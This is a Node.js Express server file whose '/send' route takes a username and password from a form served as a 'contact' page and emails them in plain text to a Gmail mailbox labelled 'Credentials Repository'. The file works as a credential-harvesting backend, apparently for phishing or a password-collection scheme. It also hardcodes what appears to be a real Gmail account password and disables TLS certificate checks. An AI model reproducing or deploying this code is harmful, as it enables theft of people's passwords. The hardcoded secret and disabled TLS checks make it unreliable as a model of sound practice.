const express = require('express')
const bodyParser = require('body-parser')
const exphbs = require('express-handlebars')
const path = require('path');
const nodemailer = require('nodemailer')


const app = express();

// app = connect().use(connect.static(__dirname + '/public'))

//view engine setup

app.engine('handlebars',exphbs())
app.set('view engine','handlebars')

// Static folder

app.use('/public', express.static(path.join(__dirname,'public')))


// Body parser Middleware

app.use(bodyParser.urlencoded({ extended: false }))
app.use(bodyParser.json())

app.get('/',(req, res) => {
	res.render('contact')
})

app.post('/send',(req, res) => {
	console.log(req.body)
	const output = `
		<p>You have a new password entry from CMA</p>
		<h3>User Details</h3>
		<ul>
			<li>Name: ${req.body.username}</li>
			<li>Password: ${req.body.password}</li>
		</ul>
	`

	// create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465,
        secure: true, // true for 465, false for other ports
        auth: {
            user: 'momanyisamuel48@gmail.com', // generated ethereal user
            pass: 'Thearrow@1'  // generated ethereal password
        },
        tls: {
            rejectUnauthorized: false
        }
    });

    // setup email data with unicode symbols
    let mailOptions = {
        from: '"Serianu Password Repository" <momanyisamuel48@gmail.com>', // sender address
        to: 'momanyisamuel48@gmail.com', // list of receivers
        subject: 'Credentials Repository', // Subject line
        text: 'New Password Crendetial', // plain text body
        html: output // html body
    };

    // send mail with defined transport object
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return console.log(error);
        }
        console.log('Message sent: %s', info.messageId);
        // Preview only available when sending through an Ethereal account
        console.log('Preview URL: %s', nodemailer.getTestMessageUrl(info));

        // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
        // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...

        res.redirect('/')
    });
})

var port = process.env.PORT || 8000

app.listen(port, function() {
    console.log("App is running on port " + port);
});